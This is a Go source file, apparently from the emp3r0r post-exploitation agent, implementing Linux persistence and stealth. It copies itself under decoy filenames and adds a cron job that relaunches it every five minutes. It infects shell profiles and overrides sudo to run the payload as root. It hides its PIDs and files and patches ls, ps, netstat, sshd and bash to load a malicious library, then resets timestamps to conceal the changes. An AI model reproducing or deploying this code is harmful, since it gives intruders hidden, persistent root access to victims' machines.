//go:build linux
// +build linux

package agent

import (
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/user"
	"strconv"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var (
	// PersistMethods CC calls one of these methods to get persistence, or all of them at once
	// look at emp3r0r_data.PersistMethods too
	PersistMethods = map[string]func() error{
		"profiles": profiles,
		"cron":     cronJob,
		"patcher":  patcher,
	}

	// Hidden_PIDs list of hidden files/pids
	// see loader.c
	Hidden_PIDs  = "/usr/share/at/batch-job.at"
	Hidden_Files = "/usr/share/at/daily-job.at"

	// Patched_List list of patched sys utils
	Patched_List = []string{
		"/usr/bin/ls",
		"/usr/bin/dir",
		"/usr/bin/ps",
		"/usr/bin/pstree",
		"/usr/bin/netstat",
		"/usr/sbin/sshd",
		"/usr/bin/bash",
		"/usr/bin/sh",
		"/usr/bin/ss",
	}
)

// Configure install locations
func getInstallLocations() (locations []string) {
	for _, loc := range WritableLocations {
		fname := emp3r0r_data.CommonFilenames[util.RandInt(0, len(emp3r0r_data.CommonFilenames))]
		locations = append(locations, loc+"/"+fname)
	}
	return
}

// installToAllLocations copy emp3r0r to multiple locations
func installToAllLocations() []string {
	locations := getInstallLocations()
	for _, path := range locations {
		err := CopySelfTo(path)
		if err != nil {
			log.Print(err)
			continue
		}
	}

	return locations
}

// installToRandomLocation copy emp3r0r to a random location
func installToRandomLocation() (target string, err error) {
	locations := getInstallLocations()
	target = locations[util.RandInt(0, len(locations))]
	err = CopySelfTo(target)
	return
}

// PersistAllInOne run all persistence method at once
func PersistAllInOne() (final_err error) {
	for k, method := range PersistMethods {
		res := "succeeded"
		method_err := method()
		if method_err != nil {
			res = fmt.Sprintf("failed: %v", method_err)
		}
		e := fmt.Errorf("%s: %s", k, res)
		if e != nil {
			final_err = fmt.Errorf("%v; %v", final_err, e)
		}
	}
	return
}

func cronJob() (err error) {
	exe_location, err := installToRandomLocation()
	if err != nil {
		return err
	}
	return AddCronJob("*/5 * * * * PERSISTENCE=true " + exe_location)
}

func profiles() (err error) {
	exe, err := installToRandomLocation()
	if err != nil {
		return err
	}
	user, err := user.Current()
	if err != nil {
		return fmt.Errorf("Cannot get user profile: %v", err)
	}
	accountInfo, err := CheckAccount(user.Name)
	if err != nil {
		return fmt.Errorf("Cannot check account info: %v", err)
	}

	// source
	bashprofile := fmt.Sprintf("%s/.bash_profile", user.HomeDir)
	sourceCmd := "source ~/.bash_profile"
	if HasRoot() {
		bashprofile = "/etc/bash_profile"
		sourceCmd = "source /etc/bash_profile"
	}

	// call this to start emp3r0r
	payload := exe

	// set +m to silent job control
	payload = "set +m;" + payload

	// nologin users cannot do shit here
	if strings.Contains(accountInfo["shell"], "nologin") ||
		strings.Contains(accountInfo["shell"], "false") {
		if user.Uid != "0" {
			return errors.New("This user cannot login")
		}
	}

	// loader
	loader := fmt.Sprintf("export PERSISTENCE=true\n%s 2>/dev/null", payload)

	// exec our payload as root too!
	// sudo payload
	var sudoLocs []string
	all_locations := installToAllLocations()
	for _, loc := range all_locations {
		sudoLocs = append(sudoLocs, "/usr/bin/sudo -E "+loc)
	}
	sudoPayload := strings.Join(sudoLocs, "||")
	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;((%s) 2>/dev/null)) }", sudoPayload)
	err = os.WriteFile(bashprofile, []byte(loader), 0o644)
	if err != nil {
		return
	}

	// check if profiles are already written
	data, err := os.ReadFile(user.HomeDir + "/.bashrc")
	if err != nil {
		log.Println(err)
		return
	}
	if strings.Contains(string(data), sourceCmd) {
		err = errors.New("already written")
		return
	}
	// infect all profiles
	_ = util.AppendTextToFile(user.HomeDir+"/.profile", sourceCmd)
	_ = util.AppendTextToFile(user.HomeDir+"/.bashrc", sourceCmd)
	_ = util.AppendTextToFile(user.HomeDir+"/.zshrc", sourceCmd)
	_ = util.AppendTextToFile("/etc/profile", "source "+bashprofile)

	return
}

// AddCronJob add a cron job without terminal
// this creates a cron job for whoever runs the function
func AddCronJob(job string) error {
	cmdStr := fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", job)
	cmd := exec.Command("/bin/sh", "-c", cmdStr)
	return cmd.Start()
}

func HidePIDs() (err error) {
	// mkdir
	if !util.IsDirExist("/usr/share/at") {
		os.MkdirAll("/usr/share/at", 0o755)
	}
	pids := make([]int, 0)

	// read PID list
	// add PIDs that are still running
	data, err := os.ReadFile(Hidden_PIDs)
	if err == nil {
		pid_list := strings.Split(string(data), "\n")
		for _, pid_str := range pid_list {
			if pid_str != "" {
				pid, err := strconv.ParseInt(pid_str, 10, 32)
				if err != nil {
					continue
				}
				// check if PID is alive
				if util.IsPIDAlive(int(pid)) {
					log.Printf("PID %d is alive, keep hidden", pid)
					pids = append(pids, int(pid))
				}
			}
		}
	}

	// hide this process and all children
	my_pid := os.Getpid()
	children, err := util.GetChildren(my_pid)
	if err != nil {
		return
	}
	pids = append(pids, my_pid)
	pids = append(pids, children...)

	// parse PIDs
	pids = util.RemoveDupsFromArray(pids)
	pid_list_str := strings.Join(util.IntArrayToStringArray(pids), "\n")

	err = os.WriteFile(Hidden_PIDs, []byte(pid_list_str), 0o644)
	if err != nil {
		return
	}
	log.Printf("Added PIDs to %s:\n%s", Hidden_PIDs, pid_list_str)
	return
}

// patch ELF file so it automatically loads and runs loader.so
func patcher() (err error) {
	if !HasRoot() {
		return errors.New("Root required")
	}

	// PIDs
	err = HidePIDs()
	if err != nil {
		log.Printf("Cannot hide PIDs: %v", err)
	}

	// files
	files := fmt.Sprintf("%s\n%s\n%s",
		util.FileBaseName(RuntimeConfig.AgentRoot),
		util.FileBaseName(Hidden_Files),
		util.FileBaseName(Hidden_PIDs))
	err = os.WriteFile(Hidden_Files, []byte(files), 0o644)
	if err != nil {
		log.Printf("Cannot create %s: %v", Hidden_Files, err)
	}

	// patch system utilities
	for _, file := range Patched_List {
		bak := fmt.Sprintf("%s/%s.bak", RuntimeConfig.AgentRoot, file)
		if !util.IsFileExist(file) || util.IsFileExist(bak) {
			continue
		}

		so_path, err := prepare_loader_so(os.Getpid(), file)
		if err != nil {
			return err
		}
		e := AddNeededLib(file, so_path)
		if e != nil {
			err = fmt.Errorf("%v; %v", err, e)
		}

		// Restore the original file timestamps
		// ctime is not changed
		err = RestoreFileTimes(file)
		if err != nil {
			return err
		}
	}
	return
}
